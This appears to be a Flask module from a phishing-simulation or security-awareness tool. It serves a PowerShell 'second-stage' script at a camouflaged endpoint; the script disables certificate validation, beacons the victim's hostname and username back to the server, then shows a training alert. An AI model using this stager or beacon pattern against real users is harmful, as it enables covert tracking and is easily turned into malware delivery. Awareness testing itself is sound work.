import re
from flask import Blueprint, request, Response, current_app
from app.utils import log_event

stealth_bp = Blueprint('stealth', __name__)

# Allowlist of valid training event types to prevent injection
ALLOWED_TRAINING_EVENTS = frozenset({
    'TRAINING_VIEWED',
    'TRAINING_COMPLETED',
    'TRAINING_ACKNOWLEDGED'
})

def sanitize_input(value, max_length=100):
    """Sanitize user input to prevent injection attacks."""
    if not value:
        return None
    # Remove control characters and limit length
    clean = re.sub(r'[\x00-\x1f\x7f-\x9f]', '', str(value))
    return clean[:max_length] if clean else None

# Note: The routes here are dynamic based on config, so we'll register them in the create_app factory or use a before_app_request to handle dynamic routing if needed.
# However, a cleaner approach for Flask Blueprints with dynamic prefixes is to register the blueprint with a url_prefix, but here the endpoints are distinct.
# We will define the view functions here and register them manually in the factory or use a custom registration function.

def serve_payload(user_id):
    """Serve the second-stage PowerShell script."""
    # CRITICAL: Use configured SERVER_URL for cloud/proxy compatibility.
    public_host = current_app.config.get('SERVER_URL') or request.host
    
    # Strip protocol if accidentally included in config
    if '://' in public_host:
        public_host = public_host.split('://')[1]

    server_url = f"https://{public_host}"
    
    payload_message = current_app.config['PAYLOAD_MESSAGE']
    training_url = current_app.config['TRAINING_URL']
    verify_endpoint_conf = current_app.config.get('ENDPOINT_VERIFY', '/verify')
    if not verify_endpoint_conf.startswith('/'): verify_endpoint_conf = '/' + verify_endpoint_conf
    
    if training_url.startswith('/'):
        training_url = f"{server_url}{training_url}"

    ps_script = f"""
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}
$wc = New-Object System.Net.WebClient
$url = "{server_url}{verify_endpoint_conf}/{user_id}?h=$env:COMPUTERNAME&u=$env:USERNAME"
$wc.DownloadString($url) | Out-Null
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show('{payload_message}', 'Security Training Alert', 'OK', 'Warning')
Start-Process "{training_url}/{user_id}"
"""
    return Response(ps_script, mimetype='text/plain')

def verify_execution(user_id):
    # Sanitize hostname and username to prevent injection
    hostname = sanitize_input(request.args.get('h'))
    username = sanitize_input(request.args.get('u'))
    log_event(user_id, 'PAYLOAD_EXECUTED', hostname, username)
    return Response("OK", status=200)

def track_click(user_id):
    log_event(user_id, 'BUTTON_CLICK')
    return Response("OK", status=200)

def track_training(user_id):
    """Track training module progress."""
    section = request.args.get('section', 'TRAINING_VIEWED')
    # Validate event type against allowlist to prevent injection
    if section not in ALLOWED_TRAINING_EVENTS:
        section = 'TRAINING_VIEWED'
    log_event(user_id, section)
    return Response("OK", status=200)

def register_stealth_routes(app):
    """Register configurable stealth endpoints based on environment config."""
    payload_endpoint = app.config.get('ENDPOINT_PAYLOAD', '/api/v2/config')
    verify_endpoint = app.config.get('ENDPOINT_VERIFY', '/verify')
    track_endpoint = app.config.get('ENDPOINT_TRACK', '/track/click')
    training_track_endpoint = app.config.get('ENDPOINT_TRAINING_TRACK', '/track/training')

    # Ensure endpoints are clean
    if not payload_endpoint.startswith('/'): payload_endpoint = '/' + payload_endpoint
    if not verify_endpoint.startswith('/'): verify_endpoint = '/' + verify_endpoint
    if not track_endpoint.startswith('/'): track_endpoint = '/' + track_endpoint
    if not training_track_endpoint.startswith('/'): training_track_endpoint = '/' + training_track_endpoint

    app.add_url_rule(f'{payload_endpoint}/<user_id>', view_func=serve_payload)
    app.add_url_rule(f'{verify_endpoint}/<user_id>', view_func=verify_execution)
    app.add_url_rule(f'{track_endpoint}/<user_id>', view_func=track_click, methods=['POST'])
    app.add_url_rule(f'{training_track_endpoint}/<user_id>', view_func=track_training, methods=['POST'])